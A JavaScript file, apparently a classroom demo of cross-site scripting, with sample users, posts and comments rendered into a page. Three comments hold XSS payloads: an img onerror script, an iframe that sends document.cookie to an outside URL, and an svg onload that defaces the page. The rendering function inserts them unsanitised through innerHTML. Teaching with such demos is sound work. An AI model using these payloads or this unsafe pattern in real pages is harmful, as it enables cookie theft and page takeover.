var users = {
  14587: {
    name: 'Ivan',
    email: 'ivan78@gmail.com'
  },
  28419: {
    name: 'Georg',
    email: 'georg.klep@gmail.com'
  },
  41457: {
    name: 'Stephan',
    email: 'stephan.borg@gmail.com'
  }
}
var posts = {
        7891451: {
                author: 14587,
                text: `Imagine we can encapsulate these secondary responsibilities in functions /  
                        The static String.fromCharCode() method returns a string created 
                        from the specified sequence of UTF-16 code units`
        },
        7891452: {
                author: 28419,
                text: `В конструкторе ключевое слово super используется как функция, вызывающая родительский конструктор. 
                        Её необходимо вызвать до первого обращения к ключевому слову this в теле конструктора. 
                        Ключевое слово super также может быть использовано для вызова функций родительского объекта`
        },
        7891453: {
                author: 28419,
                text: `DOM не обрабатывает или не вынуждает проверять пространство имен как таковое. 
                        Префикс пространства имен, когда он связан с конкретным узлом, не может быть изменен`
        },
        7891454: {
                author: 14587,
                text: `Ключевое слово super используется для вызова функций, принадлежащих родителю объекта. 
                        Глобальный объект String является конструктором строк, или, последовательностей символов.
                        HTML элемент <template> — это механизм для отложенного рендера клиентского контента, 
                        который не отображается во время загрузки, но может быть инициализирован при помощи JavaScript`
        }
}
var comments = {
        91078454: {
                postId: 7891451,
                author: 28419,
                text: `<IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>`
        },
        91078455: {
                postId: 7891452,
                author: 41457,
                text: `<IFRAME SRC=js/attack.html 
                          onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + 
                            document.cookie, '_self')">
                      </IFRAME>
`
        },
        91078457: {
                postId: 7891453,
                author: 41457,
                text: `<svg/onload='document.write("Looser");
                  document.body.style.backgroundColor="black";
                  document.body.style.color="red";
                  document.body.style.fontSize="50px";
                  document.body.style.fontWeight="bold";
                  document.body.style.textAlign="center";
                  document.body.style.paddingTop="45%";'>`
        },
        91078458: {
                postId: 7891454,
                author: 14587,
                text: `The Element.namespaceURI read-only property returns the namespace URI of the element, 
                        or null if the element is not in a namespace`
        }
}

function getCurrentPostComments ( postId ) {
        for ( var x in comments ) {
                if ( comments [ x ].postId === postId ) {
                        var comment = document.createElement ( 'p' )
                        comment.innerHTML = '<b>' + 
                                users [ comments [ x ].author ].name + 
                                '</b></br>' + comments [ x ].text
                        document.body.appendChild ( comment )
                }
        }
}
getCurrentPostComments ( 7891453 )
